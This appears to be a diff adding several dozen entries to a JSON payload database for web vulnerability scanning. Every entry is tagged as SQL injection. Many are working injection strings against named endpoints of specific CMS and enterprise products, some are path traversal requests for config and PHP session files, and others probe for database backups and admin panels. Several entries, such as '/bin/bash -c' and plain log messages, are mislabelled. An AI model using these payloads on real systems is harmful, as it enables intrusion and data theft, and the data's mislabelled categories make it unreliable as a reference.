@@ -427,5 +427,830 @@
       "expected_status_code": 200,
       "success_regex": "error|sql|syntax"
     }
+  },
+  {
+    "payload_id": "OWP-243554",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "MySQL",
+    "injection_point": "path_parameter",
+    "payload_string": "/usr/lib/lib_mysqludf_sys.so",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243817",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/usr/share/sqlmap/tamper/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-401927",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/vertica/Parser/scan",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404696",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/inc/data/database.sdb",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404734",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/sa.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404735",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/wwwroot.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404736",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/backup.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404737",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/database.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404738",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/data.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404739",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/db_backup.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404740",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/dbdump.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404741",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/db.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404742",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/dump.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404743",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/localhost.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404744",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/localhost_db.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404745",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "MySQL",
+    "injection_point": "path_parameter",
+    "payload_string": "/mysqldump.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404746",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "MySQL",
+    "injection_point": "path_parameter",
+    "payload_string": "/mysql.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404747",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/site.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404748",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/sql.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404749",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/temp.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404750",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/translate.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404751",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/users.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404752",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/www.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404753",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/dump.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-404754",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "MySQL",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/mysql.bak",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-405559",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/.sqlite_history",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-405825",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "SQLite",
+    "injection_point": "path_parameter",
+    "payload_string": "/sqlite/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-405826",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/sqlitemanager/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-406096",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "SQLite",
+    "injection_point": "path_parameter",
+    "payload_string": "/slnx.sqlite",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-406097",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "SQLite",
+    "injection_point": "path_parameter",
+    "payload_string": "/.vs/slnx.sqlite",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-406873",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/pma/index.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-406874",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/pmd/index.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-406875",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/phpmyadmin/index.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-406876",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/_phpmyadmin/index.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-406938",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{num}}))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-406957",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/member/ajax_membergroup.php?action=post&membergroup=@`",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-406965",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "MySQL",
+    "injection_point": "path_parameter",
+    "payload_string": "/CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407086",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/index.php?option=com_departments&id=-1%20UNION%20SELECT%201,md5({{num}}),3,4,5,6,7,8--",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407093",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/index.php?option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&page=index.php&format=xml&task=showproducts&view=med&sort=latest&sortdir=%27",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407096",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407133",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407141",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407156",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/?case=crossall&act=execsql&sql=WY8gzSfZwW9R5YvyK",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407172",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/user/City_ajax.aspx?CityId=33",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407174",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{num}})))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407182",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "MySQL",
+    "injection_point": "path_parameter",
+    "payload_string": "/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5({{num}}),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407188",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{num}})%27",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407192",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407208",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/bin/bash -c",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407217",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5({{num}})),0x7e),1))%23",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407290",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/data/pbootcms.db",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407294",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/api.php?c=project&f=index&token=1234&id=news&sort=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407315",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5({{num}})))),@`%27`",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407390",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/index.php?m=member&f=login_save",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407393",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/themes/xhibiter/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407394",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/?PagePrincipale/rss&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5({{num}}),1,user()))))--+-",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407396",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "MySQL",
+    "injection_point": "path_parameter",
+    "payload_string": "/admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5({{num}})%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407421",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407422",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/scrm/crm/admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407433",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407441",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/arcade.php?act=Arcade&do=stats&comment=a&s_id=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407458",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/mobile/plugin/CheckServer.jsp?type=mobileSetting",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407459",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes(",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407460",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/Api/portal/elementEcodeAddon/getSqlData?sql=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407461",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407471",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407549",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/database-backups/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407550",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/backup-db/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407669",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/common/dept.jsp?deptid=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407673",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{num}}))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408091",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../lib/functions_SQL.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408117",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Sql injection succeeded...\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408146",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Starting the SQL Injection...\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408324",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/showfile.php?section=0&pompier=1&file=../../../conf/sql.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408351",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
   }
 ]
